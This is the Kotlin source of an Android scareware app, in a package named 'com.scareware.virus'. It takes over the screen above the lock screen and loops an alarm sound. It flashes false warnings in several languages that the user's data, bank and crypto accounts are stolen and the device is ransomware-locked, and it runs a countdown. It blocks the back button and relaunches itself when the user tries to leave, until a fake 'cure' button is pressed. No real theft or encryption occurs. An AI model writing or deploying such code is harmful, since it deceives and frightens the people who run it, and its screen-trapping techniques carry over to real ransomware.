package com.scareware.virus

import android.graphics.Color
import android.media.AudioAttributes
import android.media.MediaPlayer
import android.media.RingtoneManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.View
import android.view.WindowManager
import android.view.animation.AlphaAnimation
import android.view.animation.Animation
import android.widget.Button
import android.widget.ImageView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import kotlin.random.Random

class MainActivity : AppCompatActivity() {

    private var mediaPlayer: MediaPlayer? = null
    private val handler = Handler(Looper.getMainLooper())
    private var glitchRunnable: Runnable? = null
    private var isLocked = true

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.addFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            window.attributes.layoutInDisplayCutoutMode =
                WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
        }

        window.decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                        or View.SYSTEM_UI_FLAG_FULLSCREEN
                        or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                )

        setContentView(R.layout.activity_main)
        startScare()
    }

    private fun startScare() {
        try {
            mediaPlayer = MediaPlayer.create(this, R.raw.scare_sound)
            mediaPlayer?.isLooping = true
            mediaPlayer?.setVolume(1f, 1f)
            mediaPlayer?.start()
        } catch (e: Exception) {
            val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
            mediaPlayer = MediaPlayer().apply {
                setDataSource(this@MainActivity, uri)
                setAudioAttributes(
                    AudioAttributes.Builder()
                        .setUsage(AudioAttributes.USAGE_ALARM)
                        .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                        .build()
                )
                isLooping = true
                prepare()
                start()
            }
        }

        startGlitch()

        val messages = listOf(
            "⚠ DỮ LIỆU CỦA BẠN ĐÃ BỊ ĐÁNH CẮP ⚠",
            "⚠ YOUR DATA HAS BEEN STOLEN ⚠",
            "⚠ 您的数据已被窃取 ⚠",
            "⚠ تم سرقة بياناتك ⚠",
            "BANK / CRYPTO COMPROMISED",
            "PHOTOS & MESSAGES UPLOADED",
            "DEVICE LOCKED BY RANSOMWARE"
        )

        val scareText = findViewById<TextView>(R.id.scareText)
        var idx = 0
        handler.post(object : Runnable {
            override fun run() {
                if (!isLocked) return
                scareText.text = messages[idx % messages.size]
                idx++
                handler.postDelayed(this, 1600)
            }
        })

        val timerView = findViewById<TextView>(R.id.timerText)
        var seconds = 3599
        handler.post(object : Runnable {
            override fun run() {
                if (!isLocked) return
                timerView.text = String.format("TIME LEFT: %02d:%02d", seconds / 60, seconds % 60)
                if (seconds > 0) seconds--
                handler.postDelayed(this, 1000)
            }
        })

        findViewById<Button>(R.id.cureButton).setOnClickListener {
            showCure()
        }
    }

    private fun startGlitch() {
        val root = findViewById<View>(R.id.rootLayout)
        val img = findViewById<ImageView>(R.id.scaryImage)
        glitchRunnable = object : Runnable {
            override fun run() {
                if (!isLocked) return
                val colors = intArrayOf(
                    Color.BLACK, Color.RED, Color.rgb(40, 0, 0),
                    Color.WHITE, Color.rgb(180, 0, 0)
                )
                root.setBackgroundColor(colors[Random.nextInt(colors.size)])

                val anim = AlphaAnimation(0.25f, 1f)
                anim.duration = 70
                anim.repeatMode = Animation.REVERSE
                anim.repeatCount = 2
                img.startAnimation(anim)

                handler.postDelayed(this, Random.nextLong(100, 380))
            }
        }
        handler.post(glitchRunnable!!)
    }

    private fun showCure() {
        val cure = findViewById<TextView>(R.id.cureText)
        cure.visibility = View.VISIBLE
        cure.text = """
            【解除病毒 / إزالة الفيروس】
            
            输入密码 / أدخل كلمة المرور:
            解除码: 病毒已清除
            رمز الإزالة: تم إزالة الفيروس
            
            正在清理中... جاري التنظيف...
        """.trimIndent()

        handler.postDelayed({
            isLocked = false
            mediaPlayer?.stop()
            mediaPlayer?.release()
            mediaPlayer = null
            glitchRunnable?.let { handler.removeCallbacks(it) }
            finishAffinity()
            moveTaskToBack(true)
        }, 3200)
    }

    override fun onBackPressed() {
        if (!isLocked) super.onBackPressed()
    }

    override fun onUserLeaveHint() {
        if (isLocked) {
            val i = intent
            i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP)
            startActivity(i)
        }
    }

    override fun onDestroy() {
        mediaPlayer?.release()
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }
}
